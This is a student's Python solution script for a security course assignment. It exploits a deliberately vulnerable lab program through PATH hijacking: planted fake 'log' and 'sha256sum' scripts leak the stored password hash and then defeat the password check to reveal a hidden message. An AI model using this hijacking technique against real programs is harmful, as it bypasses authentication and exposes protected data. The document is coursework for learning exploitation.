
# Benny Liang | UCID: 30192142 | Assignment 3

"""
TASK 5 solution explanation
========================================================================

### how I found the vulnerability
* 

### how the script works
* I used `pexpect.popen_spawn.PopenSpawn` to start and to interact with the vulnerable program
* I started the vulnerable executable with a wrapper function `color_spawn()`, which calls `pexpect.popen_spawn.PopenSpawn`

"""

import os
import sys
from pexpect import popen_spawn
import pexpect

import subprocess
import time
import re
import stat

# debugging output controlled via DEBUG environment variable
DEBUG = os.environ.get("DEBUG", "0") in ["1", "color"]
DEBUG_COLOR = os.environ.get("DEBUG", "0").lower() == "color"


class ColoredLog:
    """A pexpect logfile that adds color to output."""

    def __init__(self, color="1;34"):
        self.prefix = f"\033[{color}m".encode("ascii") if DEBUG_COLOR else b""
        self.suffix = b"\033[0m" if DEBUG_COLOR else b""

    def write(self, s: bytes):
        """write() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.write(self.prefix)
            # convert s to string but escape non-printable characters with backslash escapes
            ss = ""
            for c in s:
                if chr(c) in "\\":  # escape backslash and brackets
                    ss += "\\" + chr(c)
                elif (c >= 32 and c <= 126) or (chr(c) in "\n\t"):
                    ss += chr(c)
                else:
                    ss += f"\\{c:02x}"
            sys.stdout.buffer.write(ss.encode("ascii"))
            sys.stdout.buffer.write(self.suffix)

    def flush(self):
        """flush() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.flush()


def color_spawn(*args, **kwargs):
    """wrapper for pexpect.popen_spawn.PopenSpawn() and attaching a logger"""
    p = popen_spawn.PopenSpawn(*args, **kwargs)
    p.logfile_read = ColoredLog("1;34")
    p.logfile_send = ColoredLog("1;32")
    return p


def write_executable(path: str, content: str):
    with open(path, "w") as f:
        f.write(content)
    st = os.stat(path)
    os.chmod(path, st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)


def main(execname):
    """exploit the vulnerable executable using pexpect"""

    try:
        # prepare a tiny 'log' helper that prints its 2nd arg (the stored hash)
        cwd = os.getcwd()
        log_path = os.path.join(cwd, "log")
        log_sh = """#!/bin/sh
        # log -stored-hash '<hash>' will come in as $1 and $2
        # print the second argument (the stored hash) to stdout
        printf '%s\n' "$2"
        """
        write_executable(log_path, log_sh)
        
        # Launch the program with our PATH first so our ./log is used
        env = os.environ.copy()
        env["PATH"] = cwd + os.pathsep + env.get("PATH", "")

        # start the vulnerable program
        # since popen() is not using pty, we need to use stdbuf(1)
        # to disable output buffering
        process = color_spawn(f"stdbuf -o0 {execname}", timeout=5, env=env)

        # wait for the password prompt, and capture whatever was printed before it
        process.expect_exact("Password:")
        before = process.before.decode("ascii", errors="ignore")

        # extract a 64-hex-digit sha256 hash from the output
        m = re.search(r"[0-9a-fA-F]{64}", before)
        if not m:
            print("Failed to find stored hash in program output. Collected output:")
            print(before)
            process.terminate(force=True)
            return
        stored_hash = m.group(0)
        print("Recovered stored hash:", stored_hash)

        # finish/clean that run by sending an empty password so it exits
        process.sendline("")  # will produce "Password does not match! Bye." and exit
        try:
            process.expect_exact("Password does not match! Bye.", timeout=2)
            process.expect(pexpect.EOF, timeout=2)
        except Exception:
            # ignore if timing differs
            pass

        # Create a fake sha256sum that always outputs the discovered stored hash
        sha_path = os.path.join(cwd, "sha256sum")
        # mimic sha256sum output format: "<hash>  -\n"
        sha_sh = f"""#!/bin/sh
        # ignore stdin, always print the stored hash we recovered
        # Output format: "<hash>  -"
        printf '%s  -\\n' "{stored_hash}"
        """
        print(f"sha_sh: `{sha_sh}`")
        write_executable(sha_path, sha_sh)

        # Run the program again with our PATH so our sha256sum is used
        process2 = color_spawn(f"stdbuf -o0 {execname}", timeout=5, env=env)

        # wait for the password prompt
        process2.expect_exact("Password:")
        # send any alphanumeric password (get_pass enforces alnum only)
        process2.sendline("anypassword123")

        # recover the hidden message markers
        process2.expect_exact("-----BEGIN HIDDEN MESSAGE-----\n")
        process2.expect_exact("-----END HIDDEN MESSAGE-----")
        hidden_message = process2.before.decode("ascii").rstrip()
        # optional: read any remaining output
        try:
            process2.expect(pexpect.EOF, timeout=2)
        except Exception:
            pass

        # print out the recovered hidden message
        print("Recovered hidden message:")
        print(hidden_message)

    except Exception:  # pylint: disable=broad-except
        print("Exploit failed.")
        if DEBUG:
            raise


if __name__ == "__main__":
    main(sys.argv[1])
